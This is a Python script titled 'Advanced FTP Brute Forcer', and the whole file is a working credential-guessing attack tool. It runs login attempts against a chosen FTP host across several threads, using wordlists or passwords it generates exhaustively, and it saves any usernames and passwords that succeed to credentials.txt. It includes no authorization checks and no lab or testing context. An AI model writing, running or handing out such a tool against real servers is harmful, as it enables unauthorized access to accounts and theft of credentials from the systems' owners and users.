# advanced_ftp_brute.py
import ftplib
import threading
import queue
import argparse
import itertools
import string
import time
from colorama import Fore, init

init(autoreset=True)

q = queue.Queue()

def load_lines(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def generate_passwords(length=4, charset=string.ascii_lowercase + string.digits):
    for pwd in itertools.product(charset, repeat=length):
        yield ''.join(pwd)

def connect_ftp(host, port, user, password, retries=3):
    for attempt in range(1, retries + 1):
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(user, password)
            print(Fore.GREEN + f"[+] SUCCESS: {user}:{password}")

            with open("credentials.txt", "a") as f:
                f.write(f"{user}@{host}:{password}\n")

            ftp.quit()
            return
        except ftplib.error_perm:
            print(Fore.RED + f"[-] Failed login: {user}:{password}")
            return
        except Exception as e:
            print(Fore.YELLOW + f"[!] Attempt {attempt} failed for {user}:{password} — {e}")
            if attempt < retries:
                time.sleep(2)
            else:
                print(Fore.RED + f"[x] Max retries reached for {user}:{password}")

def worker(host, port):
    while not q.empty():
        user, password = q.get()
        connect_ftp(host, port, user, password)
        q.task_done()

def main():
    parser = argparse.ArgumentParser(description="Advanced FTP Brute Forcer")
    parser.add_argument("--host", required=True, help="Target FTP host")
    parser.add_argument("--port", type=int, default=21, help="FTP port")
    parser.add_argument("--userfile", help="Path to username list")
    parser.add_argument("--passfile", help="Path to password list")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--generate", action="store_true", help="Use dynamic password generation")
    parser.add_argument("--charset", type=str, default=string.ascii_lowercase + string.digits, help="Character set to use for generated passwords")
    parser.add_argument("--length", type=int, default=4, help="Length of generated passwords")

    args = parser.parse_args()

    users = load_lines(args.userfile) if args.userfile else ["anonymous"]
    passwords = (
        generate_passwords(args.length, args.charset) if args.generate else load_lines(args.passfile)
    )

    for user in users:
        for password in passwords:
            q.put((user, password))

    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.host, args.port))
        t.daemon = True
        t.start()

    q.join()
    print(Fore.CYAN + "[*] Brute force completed.")

if __name__ == "__main__":
    main()
